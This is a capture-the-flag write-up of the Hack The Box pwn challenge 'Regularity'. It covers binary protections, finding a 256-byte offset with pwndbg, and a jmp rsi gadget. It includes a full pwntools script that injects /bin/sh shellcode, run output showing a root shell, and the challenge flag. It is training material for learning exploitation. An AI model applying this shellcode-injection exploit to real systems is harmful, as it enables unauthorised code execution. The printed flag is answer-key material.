---
title: "Regularity - Shellcode Injection Writeup 🔁"
tags: [HTB, binary exploitation, shellcode, stack exec, pwn]
---

# Regularity 🔁

![Category](https://img.shields.io/badge/category-Pwn-orange)
![Difficulty](https://img.shields.io/badge/difficulty-Easy-blue)
![Platform](https://img.shields.io/badge/platform-Linux-blue)
![HTB](https://img.shields.io/badge/HTb-Challenge-green)

> Nothing much changes from day to day. Famine, conflict, hatred - it's all part and parcel of the lives we live now.  

> We've grown used to the animosity that we experience every day, and that's why it's so nice to have a useful program that asks how I'm doing.  

> It's not the most talkative, though, but it's the highest level of tech most of us will ever see...

## Table of Contents 📚
- [Binary Protections Analysis](#binary-protections-analysis-️) 🛡️
- [Program Behavior](#program-behavior-) 📟
- [Reverse Engineering](#reverse-engineering-) 🔍
- [Exploitation Strategy](#exploitation-strategy-) 💣
- [What's really happening](#whats-really-happening-) 🧠
- [Full Exploit Script](#full-exploit-script-) 🧨
- [Exploitation Result](#exploitation-result-) ✅
- [Conclusion](#conclusion-) 🧾

## Binary Protections Analysis 🛡️

Output of `checksec`:

```
Arch:       amd64-64-little
RELRO:      No RELRO
Stack:      No canary found
NX:         NX unknown - GNU_STACK missing
PIE:        No PIE (0x400000)
Stack:      Executable
RWX:        Has RWX segments
Stripped:   No
```

✅ Perfect for shellcode injection: No PIE, no NX, stack is executable, and RWX segments are present.

## Program Behavior 📟

The binary prints a friendly message and asks for input:

```c
write(1, &message1, 0x2a);
read(1, &message1, 0x2a);
write(1, &message3, 0x27);
syscall();
```

The function ends with a direct syscall call, and the input is read directly to a writable (and executable) memory region.

## Reverse Engineering 🔍

- The input buffer is writable and reused from `.data` section.
- The program ends with a `syscall` instruction.
- Goal: inject shellcode and redirect execution to it.

## Exploitation Strategy 💣

Our strategy:

1. Inject shellcode at the beginning of the buffer.
2. Overflow the buffer with a controlled address.
3. Redirect execution with a gadget: `jmp rsi`.

Using `ROPgadget`, we found:

```
0x0000000000401041 : jmp rsi
```

We’ll inject the shellcode, set `rsi` to point to our shellcode, and jump.

Let's use cyclic to find the offset needed to reach RIP. In pwndbg:

```c
└──╼ $gdb ./regularity 
...
pwndbg> cyclic 1000
aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaazaaaaaabbaaaaaabcaaaaaabdaaaaaabeaaaaaabfaaaaaabgaaaaaabhaaaaaabiaaaaaabjaaaaaabkaaaaaablaaaaaabmaaaaaabnaaaaaaboaaaaaabpaaaaaabqaaaaaabraaaaaabsaaaaaabtaaaaaabuaaaaaabvaaaaaabwaaaaaabxaaaaaabyaaaaaabzaaaaaacbaaaaaaccaaaaaacdaaaaaaceaaaaaacfaaaaaacgaaaaaachaaaaaaciaaaaaacjaaaaaackaaaaaaclaaaaaacmaaaaaacnaaaaaacoaaaaaacpaaaaaacqaaaaaacraaaaaacsaaaaaactaaaaaacuaaaaaacvaaaaaacwaaaaaacxaaaaaacyaaaaaaczaaaaaadbaaaaaadcaaaaaaddaaaaaadeaaaaaadfaaaaaadgaaaaaadhaaaaaadiaaaaaadjaaaaaadkaaaaaadlaaaaaadmaaaaaadnaaaaaadoaaaaaadpaaaaaadqaaaaaadraaaaaadsaaaaaadtaaaaaaduaaaaaadvaaaaaadwaaaaaadxaaaaaadyaaaaaadzaaaaaaebaaaaaaecaaaaaaedaaaaaaeeaaaaaaefaaaaaaegaaaaaaehaaaaaaeiaaaaaaejaaaaaaekaaaaaaelaaaaaaemaaaaaaenaaaaaaeoaaaaaaepaaaaaaeqaaaaaaeraaaaaaesaaaaaaetaaaaaaeuaaaaaaevaaaaaaewaaaaaaexaaaaaaeyaaaaaae
pwndbg> run
Hello, Survivor. Anything new these days?
aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaazaaaaaabbaaaaaabcaaaaaabdaaaaaabeaaaaaabfaaaaaabgaaaaaabhaaaaaabiaaaaaabjaaaaaabkaaaaaablaaaaaabmaaaaaabnaaaaaaboaaaaaabpaaaaaabqaaaaaabraaaaaabsaaaaaabtaaaaaabuaaaaaabvaaaaaabwaaaaaabxaaaaaabyaaaaaabzaaaaaacbaaaaaaccaaaaaacdaaaaaaceaaaaaacfaaaaaacgaaaaaachaaaaaaciaaaaaacjaaaaaackaaaaaaclaaaaaacmaaaaaacnaaaaaacoaaaaaacpaaaaaacqaaaaaacraaaaaacsaaaaaactaaaaaacuaaaaaacvaaaaaacwaaaaaacxaaaaaacyaaaaaaczaaaaaadbaaaaaadcaaaaaaddaaaaaadeaaaaaadfaaaaaadgaaaaaadhaaaaaadiaaaaaadjaaaaaadkaaaaaadlaaaaaadmaaaaaadnaaaaaadoaaaaaadpaaaaaadqaaaaaadraaaaaadsaaaaaadtaaaaaaduaaaaaadvaaaaaadwaaaaaadxaaaaaadyaaaaaadzaaaaaaebaaaaaaecaaaaaaedaaaaaaeeaaaaaaefaaaaaaegaaaaaaehaaaaaaeiaaaaaaejaaaaaaekaaaaaaelaaaaaaemaaaaaaenaaaaaaeoaaaaaaepaaaaaaeqaaaaaaeraaaaaaesaaaaaaetaaaaaaeuaaaaaaevaaaaaaewaaaaaaexaaaaaaeyaaaaaae

Program received signal SIGSEGV, Segmentation fault.
0x000000000040106e in read ()
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]────────────────────
 ...
 RSP  0x7fffffffdd98 ◂— 0x6261616161616168 ('haaaaaab')
 RIP  0x40106e (read+35) ◂— ret 
 ...
pwndbg> cyclic -l haaaaaab
Finding cyclic pattern of 8 bytes: b'haaaaaab' (hex: 0x6861616161616162)
Found at offset 256
```

=> We need 256 bytes to reach RIP.

## What's Really Happening? 🧠

Let's break it down step-by-step:

### 1. **The Vulnerability**
The binary calls `read()` into a writable memory area (likely `.data`), and then it hits a raw `syscall` instruction:

```c
read(0, buffer, size);   // User input goes into executable memory
syscall();               // Executes whatever is in registers
```

However, **we don't use this `syscall()`**. Instead, we hijack execution **before** it gets used meaningfully.

### 2. **Our Exploit Plan**

We:
- Inject shellcode into the buffer (which is executable due to RWX segments)
- Overflow part of memory so that **a gadget `jmp rsi` is written at the return address or control point**
- The value in `rsi` (set by the program or under our control) points back to our shellcode

💡 **Note**: The reason we use jmp rsi is that the read() syscall writes our input into a buffer, and due to calling conventions on x86_64 Linux, the address of that buffer is passed in the rsi register. 

Since we don't touch rsi after the read(), it still points to the beginning of our shellcode when the gadget is triggered — making jmp rsi a perfect way to land directly into our payload.

So, when the gadget is triggered:

```assembly
jmp rsi  ; jumps to our shellcode in buffer
```

→ Execution lands in the shellcode → **`/bin/sh` is spawned**

### 3. **Do We Use the `syscall()`?**
**No.**

The `syscall` instruction that follows the `read()` is never triggered by us. Instead, we:
- Inject shellcode
- Redirect execution ourselves using a ROP gadget (`jmp rsi`)
- And jump **directly** into our shellcode (which includes its own `syscall` via `execve("/bin/sh")`)

### ✅ TL;DR
- The syscall in the binary is unused
- We overflow to control a pointer
- We use a `jmp rsi` gadget to jump into our shellcode
- Our shellcode includes the `execve("/bin/sh")` syscall
- Clean, elegant shellcode injection

## Full Exploit Script 🧨

```python
#!/usr/bin/env python3
from pwn import *
import os, sys, argparse

context.binary = './regularity'
elf = context.binary

def get_process(args):
    if args.host and args.port:
        return remote(args.host, int(args.port))
    return process(elf.path)

def find_jmp_rsi(elf):
    gadget = next(elf.search(asm('jmp rsi')))
    log.success(f"'jmp rsi' gadget found at: {hex(gadget)}")
    return gadget

def build_payload(offset=256):
    jmp_rsi_addr = find_jmp_rsi(elf)
    shellcode = asm(shellcraft.sh())
    payload = flat({
        0: shellcode,
        offset: jmp_rsi_addr
    })
    return payload

def trigger_exploit(p, payload):
    p.sendlineafter(b'days?', payload)

def main():
    parser = argparse.ArgumentParser(description="Exploit script for 'regularity'")
    parser.add_argument('--host', help='Remote host')
    parser.add_argument('--port', help='Remote port')
    args = parser.parse_args()

    p = get_process(args)
    payload = build_payload()
    trigger_exploit(p, payload)
    p.interactive()

if __name__ == "__main__":
    main()
```

```bash
python3 exploit.py
python3 exploit.py --host 1.2.3.4 --port 1337
```

## Exploitation Result ✅

```
└──╼ $python3 exploit.py --host 83.136.255.10 --port 45881
    Arch:       amd64-64-little
    RELRO:      No RELRO
    Stack:      No canary found
    NX:         NX unknown - GNU_STACK missing
    PIE:        No PIE (0x400000)
    Stack:      Executable
    RWX:        Has RWX segments
    Stripped:   No
[+] Opening connection to 83.136.255.10 on port 45881: Done
[+] 'jmp rsi' gadget found at: 0x401041
[*] Switching to interactive mode

$ whoami
root
$ cat fla*
HTB{jMp_rSi_jUmP_aLl_tH3_w4y!}
```

We gained a shell by executing our shellcode from the stack.

## Conclusion 🧾

This challenge is a clean shellcode injection exercise:

- Stack is executable
- No NX, no canary, no PIE — full control
- Inject shellcode and use a `jmp rsi` gadget to trigger it

Classic pwn setup that rewards understanding memory layout and basic ROP.

🔙 [Back to Challenge Writeups](../../)
